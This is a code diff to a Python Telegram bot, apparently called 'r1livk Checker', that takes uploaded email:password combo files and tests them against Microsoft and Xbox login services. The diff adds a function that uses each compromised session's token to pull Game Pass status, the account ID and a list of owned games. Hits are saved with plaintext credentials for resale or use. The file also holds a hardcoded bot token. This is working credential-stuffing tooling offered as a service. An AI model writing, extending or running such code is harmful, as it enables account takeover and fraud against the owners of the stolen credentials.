@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Full English & Fixed Thread-Safe)
+r1livk Checker ⚡ - Telegram Bot (Full Xbox + Minecraft + GamePass + Library Games)
 """
 
 import os
@@ -21,7 +21,7 @@ TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
 bot = telebot.TeleBot(TOKEN)
 
 REQUEST_TIMEOUT = 25
-MAX_THREADS = 20
+MAX_THREADS = 15
 
 active_scans = {}
 
@@ -54,6 +54,70 @@ def extract_url_post(text):
             url = url.replace('\\/', '/')
             return url
     return None
+
+def fetch_xbox_extra_details(session, xb_token, uhs):
+    """
+    دالة متقدمة لجلب اشتراك الجيم باس، الـ XUID، وقائمة الألعاب والـ Achievements المرتبطة بها
+    """
+    game_pass_status = "none"
+    owned_games_formatted = []
+    xuid = None
+    
+    try:
+        xsts_xb_payload = {
+            "Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
+            "RelyingParty": "http://xboxlive.com",
+            "TokenType": "JWT"
+        }
+        xsts_resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, timeout=10)
+        if xsts_resp.status_code == 200:
+            xsts_token = xsts_resp.json()['Token']
+            headers = {
+                "Authorization": f"XBL3.0 x={uhs};{xsts_token}",
+                "x-xbl-contract-version": "2"
+            }
+            
+            # 1. فحص اشتراكات الحساب (Game Pass / Ultimate)
+            sub_req = session.get("https://purchase.xboxlive.com/users/me/subscriptions", headers=headers, timeout=10)
+            if sub_req.status_code == 200:
+                sub_data = sub_req.json()
+                for sub in sub_data.get("items", []):
+                    name = sub.get("name", "").lower()
+                    if "game pass" in name or "ultimate" in name:
+                        game_pass_status = f"Active ✅ ({sub.get('name', 'Game Pass')})"
+                        break
+
+            # 2. الحصول على الـ XUID الخاص بالمستخدم
+            people_url = "https://peoplehub.xboxlive.com/users/me/people/social/summary"
+            people_resp = session.get(people_url, headers=headers, timeout=10)
+            if people_resp.status_code == 200:
+                p_data = people_resp.json()
+                if "profileUsers" in p_data and len(p_data["profileUsers"]) > 0:
+                    xuid = p_data["profileUsers"][0].get("xuid")
+
+            # 3. جلب قائمة الألعاب والـ Achievements بالتنسيق المطلوب
+            if xuid:
+                ach_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/achievements"
+                ach_resp = session.get(ach_url, headers=headers, timeout=10)
+                if ach_resp.status_code == 200:
+                    ach_data = ach_resp.json()
+                    titles = ach_data.get("titles", [])
+                    game_counter = 1
+                    for title in titles:
+                        game_name = title.get("name", "Unknown Game")
+                        earned_gs = 0
+                        achievement_progress = title.get("achievement", {})
+                        if achievement_progress:
+                            earned_gs = achievement_progress.get("earnedGamerscore", 0)
+                        
+                        owned_games_formatted.append(f"{game_counter} - {game_name} | Score: {earned_gs}G")
+                        game_counter += 1
+                        if game_counter > 15:  # حد أقصى لأول 15 لعبة لترتيب الملف
+                            break
+    except Exception:
+        pass
+        
+    return game_pass_status, owned_games_formatted
 
 def check_single_account(combo):
     parts = combo.split(':')
@@ -170,23 +234,29 @@ def check_single_account(combo):
         except:
             pass
 
-        has_gp = 'product_game_pass' in mc_ent_text
+        has_gp_basic = 'product_game_pass' in mc_ent_text
         has_mc = 'product_minecraft' in mc_ent_text
+
+        # جلب تفاصيل الألعاب والاشتراكات الدقيقة
+        detailed_gp, owned_games_list = fetch_xbox_extra_details(session, xb_token, uhs)
+        
+        final_gp = detailed_gp if "Active" in detailed_gp else ("Active ✅" if has_gp_basic else "none")
 
         session.close()
 
+        games_str = "\n".join([f"{g}" for g in owned_games_list]) if owned_games_list else "- No games found / Hidden"
+
         hit_info = (
-            f"📧 **Email:** `{email}`\n"
-            f"🔑 **Password:** `{password}`\n"
-            f"🎮 **Gamertag:** {gamertag}\n"
-            f"🏆 **Gamerscore:** {gamerscore}\n"
-            f"⛏️ **Minecraft:** {'Yes' if has_mc else 'No'}\n"
-            f"🎮 **Game Pass:** {'Yes' if has_gp else 'No'}\n"
-            f"-----------------------------------"
+            f"{email}:{password}\n"
+            f"Account: Gamertag: {gamertag} | Gamerscore: {gscore_int}G | GamePass: {final_gp} | Minecraft: {'YES' if has_mc else 'NO'}\n"
+            f"Subscriptions: \n"
+            f"Games List:\n{games_str}\n"
+            f"--------------------------------------------------"
         )
         
-        if has_gp or has_mc or gscore_int > 0:
-            return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": has_gp, "has_xbox": gscore_int > 0}
+        # شرط الصيد القوي (استبعاد الحسابات الصفرية الفارغة تماماً)
+        if "Active" in final_gp or has_mc or gscore_int > 0 or len(owned_games_list) > 0:
+            return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": ("Active" in final_gp or has_gp_basic), "has_xbox": gscore_int > 0}
         else:
             return "bad", None
 
@@ -204,14 +274,14 @@ def send_welcome(message):
     markup.add(btn_start, btn_premium, btn_account)
 
     text = (
-        "⚡ **r1livk Checker** ⚡\n\n"
+        "⚡ **r1livk Checker Pro** ⚡\n\n"
         "Welcome to the ultimate account checking bot.\n"
         "Your Status: 👤 Free (0/10000 lines today)\n\n"
         "Features:\n"
-        "• Xbox Game Pass Status\n"
-        "• Xbox Live Premium\n"
-        "• Gamertag & Profile\n"
-        "• Game entitlements\n"
+        "• Xbox Game Pass & Subscriptions\n"
+        "• Owned Games List with Gamerscore\n"
+        "• Gamertag & Gamerscore\n"
+        "• Minecraft Entitlements\n"
         "• Email Access & 2FA detection\n\n"
         "Click the button below to start checking your combo files!"
     )
@@ -226,18 +296,15 @@ def callback_query(call):
         markup.add(btn_cancel)
 
         text = (
-            "🎮 **r1livk Checker - Xbox + Minecraft + GamePass**\n\n"
-            "Full Xbox/Minecraft account capture:\n"
+            "🎮 **r1livk Checker - Full Xbox Capture**\n\n"
+            "Full account capture with Games & GamePass:\n"
             "• Minecraft Accounts\n"
             "• Xbox Game Pass Status\n"
-            "• Xbox Live Premium\n"
+            "• Owned Games List & Score\n"
             "• Gamertag & Profile\n"
-            "• Game entitlements\n"
-            "• Email Access\n"
             "• 2FA detection\n\n"
             "Send your combo file in .txt format (Direct file upload)\n"
-            "Format: `email:password`\n\n"
-            "Max: 10000 lines / day"
+            "Format: `email:password`"
         )
         bot.edit_message_text(text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
     
@@ -266,7 +333,7 @@ def handle_docs(message):
         with open(local_path, 'wb') as f:
             f.write(downloaded_file)
 
-        bot.reply_to(message, "📥 File received successfully. Starting high-speed scan...")
+        bot.reply_to(message, "📥 File received successfully. Starting high-speed scan with Games & GamePass...")
         active_scans[chat_id] = True
         threading.Thread(target=process_checker, args=(chat_id, local_path)).start()
 
@@ -288,7 +355,7 @@ def process_checker(chat_id, filepath):
     xbox_hits = 0
 
     timestamp_str = time.strftime("%Y%m%d_%H%M%S")
-    output_filename = f"r1livk_Checker_hits_{timestamp_str}.txt"
+    output_filename = f"r1livk_Checker_Full_hits_{timestamp_str}.txt"
     start_time = time.time()
 
     markup = types.InlineKeyboardMarkup(row_width=1)
@@ -297,7 +364,7 @@ def process_checker(chat_id, filepath):
     markup.add(btn_stop, btn_back)
 
     initial_status_text = (
-        f"🔥 **LIVE SCAN STATS**\n\n"
+        f"🔥 **LIVE SCAN STATS (Pro)**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Checked: 0\n"
         f"❌ Bad: 0\n"
@@ -387,7 +454,7 @@ def process_checker(chat_id, filepath):
     t_mins, t_secs = divmod(elapsed_total, 60)
 
     completion_text = (
-        f"✅ **XBOX + MINECRAFT + GAMEPASS SCAN COMPLETED!**\n\n"
+        f"✅ **XBOX FULL SCAN COMPLETED!**\n\n"
         f"📊 Total: {total}\n"
         f"🎯 Hits: {hits}\n"
         f"  • Minecraft: {mc_hits}\n"
@@ -401,12 +468,12 @@ def process_checker(chat_id, filepath):
 
     if hits > 0 and os.path.exists(output_filename):
         with open(output_filename, 'rb') as res_f:
-            bot.send_document(chat_id, res_f, caption=f"📁 All Hits File - r1livk Checker")
+            bot.send_document(chat_id, res_f, caption=f"📁 All Hits with Games & GamePass - r1livk")
 
     if os.path.exists(filepath):
         os.remove(filepath)
     active_scans[chat_id] = False
 
 if __name__ == "__main__":
-    print("r1livk Checker High-Speed Bot is running...")
+    print("r1livk Full Checker Pro is running...")
     bot.infinity_polling()
